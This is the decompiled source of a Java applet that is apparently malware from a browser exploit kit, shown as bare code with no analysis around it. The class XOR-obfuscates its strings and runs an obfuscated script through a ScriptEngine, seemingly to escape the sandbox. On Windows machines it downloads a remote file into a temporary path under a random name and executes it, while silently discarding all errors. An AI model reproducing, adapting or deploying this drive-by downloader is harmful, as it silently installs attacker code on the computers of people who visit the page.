import javax.script.Invocable;
import java.awt.Component;
import javax.script.ScriptEngineManager;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.script.ScriptEngine;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Final extends Applet
{
    public static int z;
    private static String[] m;
    
    @Override
    public String toString() {
        try {
            final String s = Final.m[6];
            if (System.getProperty(Final.m[4]).toLowerCase().contains(Final.m[5])) {
                this.e(Final.m[2] + s + Final.m[3]);
            }
        }
        catch (Exception ex) {}
        return r.a("");
    }
    
    static {
        final String[] m = new String[10];
        final int n = 0;
        final char[] charArray = r.a(".\u0010\f:").toCharArray();
        final int i = charArray.length;
        for (int n2 = 0; i > n2; ++n2) {
            final int n3 = n2;
            final char c = charArray[n3];
            char c2 = '\0';
            switch (n2 % 5) {
                case 0: {
                    c2 = '\u0015';
                    break;
                }
                case 1: {
                    c2 = 'a';
                    break;
                }
                case 2: {
                    c2 = 'b';
                    break;
                }
                case 3: {
                    c2 = '\n';
                    while (false) {}
                    break;
                }
                default: {
                    c2 = 'M';
                    break;
                }
            }
            charArray[n3] = (char)(c ^ c2);
        }
        m[n] = new String(charArray).intern();
        final int n4 = 1;
        final char[] charArray2 = r.a("k\u0015\u0003\u007fsi\u001dXb5z\u0011\u0013-").toCharArray();
        final int j = charArray2.length;
        for (int n5 = 0; j > n5; ++n5) {
            final int n6 = n5;
            final char c3 = charArray2[n6];
            char c4 = '\0';
            switch (n5 % 5) {
                case 0: {
                    c4 = '\u0015';
                    break;
                }
                case 1: {
                    c4 = 'a';
                    break;
                }
                case 2: {
                    c4 = 'b';
                    break;
                }
                case 3: {
                    c4 = '\n';
                    while (false) {}
                    break;
                }
                default: {
                    c4 = 'M';
                    break;
                }
            }
            charArray2[n6] = (char)(c3 ^ c4);
        }
        m[n4] = new String(charArray2).intern();
        final int n7 = 2;
        final char[] charArray3 = r.a("o\u0006\u0007ha)\u001b").toCharArray();
        final int k = charArray3.length;
        for (int n8 = 0; k > n8; ++n8) {
            final int n9 = n8;
            final char c5 = charArray3[n9];
            char c6 = '\0';
            switch (n8 % 5) {
                case 0: {
                    c6 = '\u0015';
                    break;
                }
                case 1: {
                    c6 = 'a';
                    break;
                }
                case 2: {
                    c6 = 'b';
                    break;
                }
                case 3: {
                    c6 = '\n';
                    while (false) {}
                    break;
                }
                default: {
                    c6 = 'M';
                    break;
                }
            }
            charArray3[n9] = (char)(c5 ^ c6);
        }
        m[n7] = new String(charArray3).intern();
        final int n10 = 3;
        final char[] charArray4 = r.a("<\n\bm+<\u0010\ftuk\u0017\u000406{\u001e\u000b0").toCharArray();
        final int l = charArray4.length;
        for (int n11 = 0; l > n11; ++n11) {
            final int n12 = n11;
            final char c7 = charArray4[n12];
            char c8 = '\0';
            switch (n11 % 5) {
                case 0: {
                    c8 = '\u0015';
                    break;
                }
                case 1: {
                    c8 = 'a';
                    break;
                }
                case 2: {
                    c8 = 'b';
                    break;
                }
                case 3: {
                    c8 = '\n';
                    while (false) {}
                    break;
                }
                default: {
                    c8 = 'M';
                    break;
                }
            }
            charArray4[n12] = (char)(c7 ^ c8);
        }
        m[n10] = new String(charArray4).intern();
        final int n13 = 4;
        final char[] charArray5 = r.a("h\u0001]v:kQ").toCharArray();
        final int length = charArray5.length;
        for (int n14 = 0; length > n14; ++n14) {
            final int n15 = n14;
            final char c9 = charArray5[n15];
            char c10 = '\0';
            switch (n14 % 5) {
                case 0: {
                    c10 = '\u0015';
                    break;
                }
                case 1: {
                    c10 = 'a';
                    break;
                }
                case 2: {
                    c10 = 'b';
                    break;
                }
                case 3: {
                    c10 = '\n';
                    while (false) {}
                    break;
                }
                default: {
                    c10 = 'M';
                    break;
                }
            }
            charArray5[n15] = (char)(c9 ^ c10);
        }
        m[n13] = new String(charArray5).intern();
        final int n16 = 5;
        final char[] charArray6 = r.a("t\u001fY").toCharArray();
        final int length2 = charArray6.length;
        for (int n17 = 0; length2 > n17; ++n17) {
            final int n18 = n17;
            final char c11 = charArray6[n18];
            char c12 = '\0';
            switch (n17 % 5) {
                case 0: {
                    c12 = '\u0015';
                    break;
                }
                case 1: {
                    c12 = 'a';
                    break;
                }
                case 2: {
                    c12 = 'b';
                    break;
                }
                case 3: {
                    c12 = '\n';
                    while (false) {}
                    break;
                }
                default: {
                    c12 = 'M';
                    break;
                }
            }
            charArray6[n18] = (char)(c11 ^ c12);
        }
        m[n16] = new String(charArray6).intern();
        final int n19 = 6;
        final char[] charArray7 = r.a("5HV\"b<QJ.f)N\u000f").toCharArray();
        final int length3 = charArray7.length;
        for (int n20 = 0; length3 > n20; ++n20) {
            final int n21 = n20;
            final char c13 = charArray7[n21];
            char c14 = '\0';
            switch (n20 % 5) {
                case 0: {
                    c14 = '\u0015';
                    break;
                }
                case 1: {
                    c14 = 'a';
                    break;
                }
                case 2: {
                    c14 = 'b';
                    break;
                }
                case 3: {
                    c14 = '\n';
                    while (false) {}
                    break;
                }
                default: {
                    c14 = 'M';
                    break;
                }
            }
            charArray7[n21] = (char)(c13 ^ c14);
        }
        m[n19] = new String(charArray7).intern();
        final int n22 = 7;
        final char[] charArray8 = r.a("!TU>;u\u001c\u0015b1e\u001bZk9R\u0011\u0005d7r\\\u000e7:iNK\"h%U\"w\u0013r\u007f\u0003V\n]\u00064p\u0012 gVH-\\\u00166v\u0001oe^^yT\u0012a>0=KF3xr\u0007\u0007d8`\u000f\u0016?5p\u001a\u00020\u001ey\u0011\u0002c54\u0006\u000fk\u0015d6\u0002O0Q\r\u001c\u007f\u001fa9\u0013@p@\u0000*sC:a\u0018\u0007-V'9l\fn-^7x9U\u000f?=`\t\u0014}q-\u0011Pe4iFK*i-U\u001cz6t\u001b\u0019!~\u0006OucFerK\u00166O\u0002zZ\u0004s*\u0005\u0005p\u000eT$0\fe=\u0005C?[UK?.i\u0018\u0004\"y{\u0011\tk'nZ\u00135e").toCharArray();
        final int length4 = charArray8.length;
        for (int n23 = 0; length4 > n23; ++n23) {
            final int n24 = n23;
            final char c15 = charArray8[n24];
            char c16 = '\0';
            switch (n23 % 5) {
                case 0: {
                    c16 = '\u0015';
                    break;
                }
                case 1: {
                    c16 = 'a';
                    break;
                }
                case 2: {
                    c16 = 'b';
                    break;
                }
                case 3: {
                    c16 = '\n';
                    while (false) {}
                    break;
                }
                default: {
                    c16 = 'M';
                    break;
                }
            }
            charArray8[n24] = (char)(c15 ^ c16);
        }
        m[n22] = new String(charArray8).intern();
        final int n25 = 8;
        final char[] charArray9 = r.a("t\u001a'k.h\u001dP").toCharArray();
        final int length5 = charArray9.length;
        for (int n26 = 0; length5 > n26; ++n26) {
            final int n27 = n26;
            final char c17 = charArray9[n27];
            char c18 = '\0';
            switch (n26 % 5) {
                case 0: {
                    c18 = '\u0015';
                    break;
                }
                case 1: {
                    c18 = 'a';
                    break;
                }
                case 2: {
                    c18 = 'b';
                    break;
                }
                case 3: {
                    c18 = '\n';
                    while (false) {}
                    break;
                }
                default: {
                    c18 = 'M';
                    break;
                }
            }
            charArray9[n27] = (char)(c17 ^ c18);
        }
        m[n25] = new String(charArray9).intern();
        final int n28 = 9;
        final char[] charArray10 = r.a("K\u0015\u0003\u007f\u000ec\u0000\u001ffl").toCharArray();
        final int length6 = charArray10.length;
        for (int n29 = 0; length6 > n29; ++n29) {
            final int n30 = n29;
            final char c19 = charArray10[n30];
            char c20 = '\0';
            switch (n29 % 5) {
                case 0: {
                    c20 = '\u0015';
                    break;
                }
                case 1: {
                    c20 = 'a';
                    break;
                }
                case 2: {
                    c20 = 'b';
                    break;
                }
                case 3: {
                    c20 = '\n';
                    while (false) {}
                    break;
                }
                default: {
                    c20 = 'M';
                    break;
                }
            }
            charArray10[n30] = (char)(c19 ^ c20);
        }
        m[n28] = new String(charArray10).intern();
        Final.m = m;
    }
    
    private JList e(final Object a) {
        return new JList((E[])new Object[] { a });
    }
    
    private void e(final ScriptEngine a, final String a) {
        try {
            a.eval(a);
        }
        catch (Exception ex) {}
    }
    
    private void e(final String a) {
        final int z = Final.z;
        final String string = System.getProperty(Final.m[1]) + r.a("\t") + (r.a("") + Math.random() * 1000.0).substring(0, 8) + Final.m[0];
        try {
            final InputStream is = Sec.createIS(a);
            final FileOutputStream fileOutputStream = new FileOutputStream(string);
            int n = 0;
            int read;
            while ((read = is.read()) != -1) {
                fileOutputStream.write(read);
                ++n;
                if (z != 0) {
                    return;
                }
                if (z != 0) {
                    break;
                }
            }
            is.close();
            fileOutputStream.close();
            Sec.exe(string);
        }
        catch (Exception ex) {
            try {
                Sec.exe(r.a("w") + string + r.a("w"));
            }
            catch (Exception ex2) {}
        }
    }
    
    private ScriptEngine a() {
        return new ScriptEngineManager().getEngineByName(Final.m[9]);
    }
    
    private void e(final JList a) {
        this.add(a);
    }
    
    @Override
    public void init() {
        this.e();
    }
    
    private void e() {
        try {
            final String a = Final.m[7];
            final ScriptEngine a2 = this.a();
            this.e(a2, a);
            this.e(this.e(((Invocable)a2).invokeFunction(Final.m[8], this)));
        }
        catch (Exception ex) {}
    }
}
